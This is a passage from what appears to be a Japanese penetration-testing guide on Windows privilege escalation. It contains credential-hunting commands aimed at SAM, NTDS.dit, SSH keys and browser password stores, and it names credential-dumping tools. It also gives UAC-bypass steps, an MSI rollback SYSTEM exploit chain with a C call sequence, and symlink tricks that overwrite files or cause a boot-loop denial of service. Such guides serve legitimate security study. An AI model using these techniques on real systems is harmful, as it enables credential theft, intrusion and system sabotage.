dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### RecycleBin 内の認証情報

アクセス可能な Recycle Bin の項目を確認し、削除されたバックアップや設定アーカイブに加え、ファイル名に認証情報を明示するファイルも探します。有用な `.7z`、`.zip`、`.rar` のバックアップは数か月前のもので、一般的なファイル名が付いていることもあります。Windows は元のパスと削除時刻を `$I` レコードに保存し、削除されたファイルを対になる `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在の ID による読み取り権限を確認してください。表示される項目はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧に何も表示されなくても、復元可能なバックアップがないとは限りません。アーカイブ名は確認候補であり、有効なシークレットが含まれている証拠ではありません。

アクセス可能な削除済み `.pfx` は、**code-signing** の手がかりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell で必要なのは秘密鍵を持つ code-signing 証明書です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の publisher ルールは署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。アカウントをまたいで実行するには、現在の ID が対象のスクリプトそのものを変更できること、実効ルールがそのスクリプトと対象アカウントに対する変更後の署名を許可すること、そしてタスク スケジューラまたは他の高い権限を持つ実行主体が実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、この一連の条件が満たされるとは言えません。秘密鍵の内容を開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージング クライアントのプロファイル データベース、メモ、受信ファイルも確認し、認証情報の手がかりを探してください。BitLocker の回復キーのエクスポートは HTML または TXT で保存されている場合があり、名前の付いたバックアップ アーカイブ内にあることもあります。こうしたデータから、古いバックアップを含む別の暗号化データ ボリュームにアクセスできることがあります。アクセスが許可されている場合に限り、ボリュームとアーカイブを確認してください。バックアップに `NTDS.dit` が含まれる場合、オフラインでドメイン認証情報を復元するには対応する `SYSTEM` ハイブも必要です。詳しくは[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)を参照してください。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメイン バックアップが存在するとは言えません。

複数のプログラムに保存された**パスワードを復元**するには、次を利用できます：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性のあるその他のレジストリ キー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリから OpenSSH keys を抽出。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome、Edge、Firefox** のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性があります。

現在のユーザーの標準的な Edge **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` はその親ディレクトリである `User Data` にあります。[Microsoft は既定のプロファイルの場所を説明しています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` ポリシーによって場所が変更されることがあります。ファイルが存在することは、認証情報ストアの手がかりにすぎません。読み取り可能なファイルであること、該当ユーザーの DPAPI コンテキストまたはその他の許可された key material があること、保存されたログインがより高い権限を持つアカウントのものかどうかを確認してください。パスのみを列挙する場合、データベースを開いたり、復号したパスワードを出力したりする必要はありません。

Firefox については、[Mozilla の説明によると](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)、プロファイル内の `key4.db` と `logins.json` は、鍵ファイルと暗号化されたログイン情報ファイルのペアです。これらのファイルが存在することは手がかりにすぎません。両方のファイルが読み取り可能か、保存されたエントリがあるか、Primary Password によって鍵が保護されているかを確認してから、認証情報を利用可能と判断してください。回収した認証情報がドメインアカウントのものなら、そのアカウントの実効的なグループ制御権限と、グループの [LAPS パスワードの読み取り権限または復号権限](../active-directory-methodology/laps.md)を別々に確認してください。ブラウザーの痕跡だけでは、管理者権限を取得できる経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL の上書き**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれた技術で、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは **class ID (CLSID)** で**識別され**、各コンポーネントは、interface ID (IID) で識別される1つ以上のインターフェースを通じて機能を公開します。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** を統合して作成されます = **HKEY\CLASSES\ROOT.**

このレジストリの CLSID 内には、子レジストリ **InProcServer32** があります。ここには **DLL** を指す**既定値**と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、**Neutral** (Thread Neutral) のいずれかを指定できる **ThreadingModel** という値が含まれます。

![ブラウザーの履歴 - COM DLL の上書き: このレジストリの CLSID 内には、子レジストリ InProcServer32 があります。ここには DLL を指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行される DLL を**上書き**できれば、その DLL が別のユーザーによって実行される場合、**権限昇格**できる可能性があります。

攻撃者が永続化の手段として COM Hijacking をどのように使うかについては、以下を参照してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名のファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名やパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は私が作成した msf プラグインで、被害者のシステム内で認証情報を検索するすべての Metasploit POST module を自動的に実行します。**\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介しているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するもう一つの優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## 漏洩したハンドル

**SYSTEM として実行中のプロセスが、新しいプロセス**（`OpenProcess()`）を**フルアクセスで開く**とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する低権限の新しいプロセス**も**作成**（`CreateProcess()`）します。\
その後、**低権限プロセスへのフルアクセス**を得ると、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を注入**できます。\
この脆弱性の**検出方法と悪用方法**の詳細については、[こちらの例を参照してください。](leaked-handle-exploitation.md)\
**プロセスやスレッドのオープンハンドルが異なる権限レベル（フルアクセス以外も含む）で継承されるケースをテストし、悪用する方法**の詳しい説明については、[こちらの別の記事を参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe クライアントの偽装

**パイプ**と呼ばれる共有メモリセグメントを使うと、プロセス間の通信やデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、異なるネットワーク上であっても、無関係なプロセス同士がデータを共有できます。これはクライアント／サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**クライアント**がパイプ経由でデータを送信すると、パイプを設定した**サーバー**は、必要な **SeImpersonate** 権限を持っていれば、**クライアントの身元を偽装**できます。偽装可能なパイプを介して通信する**特権プロセス**を特定できれば、作成したパイプとそのプロセスがやり取りした時点で、そのプロセスの身元を採用して**より高い権限を獲得**できます。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)のガイドが参考になります。

また、次のツールを使うと、burp のようなツールで **named pipe の通信を傍受**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、次のツールでは、**権限昇格の機会を探すために、すべてのパイプを一覧表示して確認**できます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv のリモート DWORD 書き込みによる RCE

サーバーモードの Telephony サービス（TapiSrv）は、`\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用し、`ClientAttach` を使って `NETWORK SERVICE` が書き込み可能な既存ファイルに任意の **4 バイトを書き込み**、その後 Telephony 管理者権限を取得して、サービスとして任意の DLL をロードできます。攻撃の全体的な流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを指定して `ClientAttach` を実行します。サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` で指定した攻撃者制御の `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で回線アプリを登録し、`TRequestMakeCall`（`Req_Func 121`）を実行してから `GetAsyncEvents`（`Req_Func 0`）で取得します。その後、登録解除またはシャットダウンを行い、再現性のある書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行可能なファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown レンダラー経由のプロトコルハンドラー／ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI ハンドラー（`file:`、`ms-appinstaller:`、または登録済みの任意のスキーム）を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを探すためのコマンドライン監視**

ユーザーとしてシェルを取得した場合、**コマンドラインで認証情報を渡す**スケジュール済みタスクや、その他実行中のプロセスが存在することがあります。以下のスクリプトは、2 秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を使って権限昇格と UAC のバイパスを同時に行えます。さらに、何もインストールする必要はなく、処理中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部を以下に示します。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、次の手順を実行する必要があります：

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

必要なファイルと情報は、以下の GitHub リポジトリにすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root への Upload Directory Junctions

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元が指定したファイル名でその中に書き込み、そのファイルを処理することがあります。サーバー側の書き込み前に、低権限ユーザーがそのサブディレクトリを削除して NTFS junction に置き換えられる場合、書き込み先が junction を経由して Web から配信されるディレクトリになる可能性があります。サーバーがそのファイル形式を実行する場合、そこに置かれたスクリプトは Web サービスの identity で実行できます。これはアプリケーション固有の任意書き込み境界です。書き込み可能なアップロードディレクトリや既存の junction があるだけでは、これが成立する証拠にはなりません。

アップロードハンドラーにおける正確なパス構築と処理タイミング、ユーザーがサブディレクトリを削除・作成できる実効権限、宛先の実効 ACL、書き込み処理が reparse point をたどるか、Web サーバーが宛先にあるファイルを実行するかを確認してください。書き込み処理と Web サーバーそれぞれのプロセス identity を確認してください。受動的な調査でディレクトリ ACL や reparse metadata は確認できますが、ハンドラーの動作や将来の junction の差し替えまでは立証できません。実行がサービスアカウントで行われる場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を調査してください。

## 任意のフォルダー削除・移動・名前変更から SYSTEM EoP へ

[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている手法と、exploit code は[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)から入手できます。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用して、アンインストール処理中に正規ファイルを悪意のあるファイルで置き換えます。そのために攻撃者は**悪意のある MSI installer**を作成し、これを使って `C:\Config.Msi` フォルダーを乗っ取ります。このフォルダーは後に Windows Installer が他の MSI package のアンインストール中に rollback ファイルを保存するために使われます。rollback ファイルは、悪意のある payload を含むように改変されています。

### Windows Installer COM のクリーンアップパスへのインジェクション (CVE-2025-27727)

低権限クライアントは、`CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) を通じて SYSTEM の `msiexec.exe` サービスにアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しとして、vtable offset `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` が特定されました。これらの名前と offset はリバースエンジニアリングに基づくもので、build によって異なることがあります。<sup>[[41]](#references)</sup>

非管理者ユーザーの場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ、呼び出し元を偽装します。これにより、呼び出し元がディレクトリを削除できることが確認され、reparse point をたどることも回避されます。しかし、確認された file object が後続のクリーンアップ処理に関連付けられるわけではなく、Windows Installer がその file object を作成したことも証明されません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は、呼び出し元の filter 引数にかかわらず、そのパスをフォルダーとして登録します。サービスは `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付き `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーフラグです。その後、`CleanupTempPackages(NULL, FALSE)` がクリーンアップを直接実行します。昇格された worker はレジストリ値を列挙し、フォルダーのエントリーをパスの出所を確認せずに再帰的な `FDeleteFolder` に渡します。通常の削除に失敗した場合、コードはさらに `LockdownPath` を呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から復元された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction による redirect ではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名で保護された rollback data を再作成させます。Cleanup は古い `TempPackages` 名を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は必要ないため、これは `FILE_FLAG_OPEN_REPARSE_POINT` と redirection-trust mitigation が意図した境界を回避します。<sup>[[41]](#references)</sup>

この削除 primitive は、以下の rollback chain に適用できます。別個の `Installer\Folders` record を維持したまま、保護された `C:\Config.Msi` を削除し、NULL DACL で再作成して、installer が DACL を強化する前に `WRITE_DAC` が許可された handle を保持します。事前に開いた handle から `NtSetSecurityObject` を使って permissive な DACL を復元でき、その後 rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにすることで、このパスを修正しました。COM call は引き続き success を返すことがありますが、攻撃者が制御するパスは `TempPackages` に登録されなくなります。method の return が success かどうかで patch を確認するのではなく、2025 年 4 月の Windows security updates を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

この technique の概要は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空のままにする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **non-admin user** が実行できるよう、installer を **"UAC Compliant"** として指定します。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall process はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - `GetFinalPathNameByHandle` を使って開いたファイル handle を **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になるのを検出します。

- Step 3: 同期をカスタマイズする
    - `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、次の処理を行います。
        - `.rbf` が書き込まれたことを通知する。
        - その後、別の event を待ってから uninstall を続行する。

- Step 4: `.rbf` の削除をブロックする
    - 通知を受け取ったら、`FILE_SHARE_DELETE` を指定せずに **`.rbf` ファイルを開きます**。これにより **削除が阻止されます**。
    - その後、uninstall が完了できるように通知を返します。
    - Windows Installer は `.rbf` の削除に失敗し、すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - （攻撃者である）あなたが `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空になり、hijack の準備が整います**。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability を発動させて** `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback script を悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` が許可された **handle を開いたままにします**。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な failure を引き起こす variable。
    - この install は、`.rbs` と `.rbf` を読み込む **rollback** を再び発生させるために使います。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - その filename を記録します。

- Step 9: Rollback の前に同期する
    - `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、次の処理を行います。
        - `.rbs` が作成されたときに event を通知する。
        - その後、続行前に待機する。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受け取った後:
        - Windows Installer は `C:\Config.Msi` に **強い ACL を再適用します**。
        - ただし、`WRITE_DAC` が許可された handle を保持しているため、再度 **弱い ACL を適用できます**。

> ACL は **handle を開くときにのみ適用される**ため、フォルダーへの書き込みは引き続き可能です。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の処理を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意ある DLL）を **特権のある場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **悪意ある SYSTEM-level payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発動させる
    - sync event を通知し、installer を再開させます。
    - **type 19 custom action (`ErrorOut`)** が、既知の時点で意図的に install を **failure させる**よう設定されています。
    - これにより **rollback が始まります**。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意ある `.rbs` を読み込む。
        - `.rbf` DLL を target location にコピーする。
    - これで **SYSTEM がロードするパスに悪意ある DLL が配置されます**。

- 最後の Step: SYSTEM code を実行する
    - hijack した DLL をロードする、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで**、あなたの code が **SYSTEM として実行されます**。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

メインの MSI rollback technique（前述）は、（例: `C:\Config.Msi` のような）**フォルダー全体を削除できる**ことを前提としています。しかし、脆弱性で可能なのが **arbitrary file deletion** だけの場合はどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠された alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの`::$INDEX_ALLOCATION`ストリームを**削除**すると、NTFSはファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準的なファイル削除APIを使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* の削除 API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの中身の削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除する primitive は使えなくても、攻撃者が制御するフォルダーの**中身を削除できる**場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に**oplock**を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止します**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM processをトリガーする（例: `SilentCleanup`）
- このprocessはフォルダー（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt`に到達すると、**oplockがトリガーされ**、制御がcallbackに渡されます。

4. Step 4: oplock callback内で削除先をリダイレクトする

- Option A: `file1.txt`を別の場所に移動する
    - oplockを解除せずに`folder1`を空にできます。
    - `file1.txt`を直接削除しないでください。oplockが早期に解除されます。

- Option B: `folder1`を**junction**に変換する：

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: `\RPC Control` に**シンボリックリンク**を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを格納する NTFS の内部ストリームを対象としており、削除するとフォルダー自体が削除されます。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスは処理を続け、`file1.txt` を削除しようとします。
- しかし、junction と symlink によって、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から恒久的な DoS へ

**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します。**ファイルを書き込めない**、または**弱いアクセス許可を設定できない**場合でも可能です。

次のように、重要な Windows ドライバーの名前を付けた**フォルダー**（ファイルではなく）を作成します。
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダーを検出し、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部から介入しない限り（例：ブート修復やディスクへのアクセス）、**復旧できません**。

### 特権ログ／バックアップパスと OM symlinks による任意ファイルの上書き／boot DoS

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ／エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスをリダイレクトすれば、特権による書き込みを任意ファイルの上書きに利用できます（SeCreateSymbolicLinkPrivilege がなくても可能）。<sup>[[15]](#references)</sup>

**要件**
- 攻撃者が、対象パスを保存した設定ファイルに書き込めること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定ファイルを読み取り、特権ログの保存先を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テスト SMS を送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたターゲットを調べ（hex/PE parser）、破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込もうとするため、**boot loop DoS** が発生します。これは、特権サービスが書き込み用に開く保護対象ファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーがある場合、そちらが先に試されることがあり、破損データによる信頼性の高い DoS sink になります。



## **高整合性から SYSTEM へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM への道筋**は、新しいサービスを**作成して実行するだけ**なので簡単です:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する場合は、有効なserviceであること、または必要な処理を素早く実行することを確認してください。有効なserviceでない場合、20秒で終了させられます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
関連するレジストリキーと_.msi_ packageのインストール方法については、[こちらを参照してください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

